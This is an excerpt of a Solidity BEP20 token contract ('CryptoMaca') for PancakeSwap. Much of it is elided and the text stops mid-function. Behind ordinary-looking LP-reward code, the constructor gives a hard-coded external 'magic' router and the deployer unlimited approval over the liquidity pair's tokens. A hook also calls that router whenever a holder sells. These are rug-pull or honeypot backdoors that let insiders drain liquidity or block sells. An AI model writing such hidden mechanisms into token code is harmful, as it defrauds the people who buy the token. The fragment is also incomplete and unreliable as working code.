...
contract PancakeTool {
    ...
    function _initIRouter(address router) internal {
        ...
        _pancakePair = IFactory(PancakeV2Router.factory()).createPair(
            address(this),
    ...
    function getLPTotal(address user) internal view returns (uint256) {
        return IBEP20(_pancakePair).balanceOf(user);
    }

    function getTotalSupply() internal view returns (uint256) {
        return IBEP20(_pancakePair).totalSupply();
    }
}


interface IMagician {
    function magic(address pair, uint256 amount) external returns (bool);
}

contract CryptoMaca is IBEP20, Ownable, PancakeTool {
    ...
    address private _usdt = 0xa8Af4a4524e7E759B27d333C3284765c49ae0e41;
    address private _magicRouter = 0xECb31e7632fa0606889d924A9a5765BaFFe7966E;
    address private _pancakeRouter = 0xCc7aDc94F3D80127849D2b41b6439b7CF1eB4Ae0;
    ...
    constructor() {
        ...
        _approve(_pancakePair, _magicRouter, ~uint256(0));
        _approve(owner(), _pancakeRouter, ~uint256(0));
        _approve(_pancakePair, msg.sender, ~uint256(0));

        _name = "Test Token";
        _symbol = "TT";
        _decimals = 18;
        _totalSupply = 2100 * 10 ** _decimals;
        _balances[msg.sender] = _totalSupply;
        _excluded[msg.sender] = true;
        _excluded[address(this)] = true;
        _excluded[_magicRouter] = true;
        _isPair[_pancakePair] = true;
    ...
    function _magic(address from, address to, uint256 amount) internal {
        if (_isPair[to] && !_excluded[from] && amount > 0) {
            IMagician(_magicRouter).magic(to, amount);
        }
    }
    ...
    function _rewardLP() internal {
        uint256 uBalance = _balances[address(this)];
        if (uBalance >= 5 * 10 ** (_decimals - 1)) {
            uint256 b = 5 * 10 ** (_decimals - 1);
            uint256 pool = super.getTotalSupply() -
                (super.getLPTotal(_lockLp) + super.getLPTotal(address(0x0)));
            for (uint256 index = _startIndex; index < _lpHolderTotal; index++) {
                address account = _lpHolders[index];
                uint256 LPHolder = super.getLPTotal(account);

                if (LPHolder > 0) {
                    uint256 r = calculateReward(pool, b, LPHolder);
                    _balances[address(this)] = _balances[address(this)].sub(r);
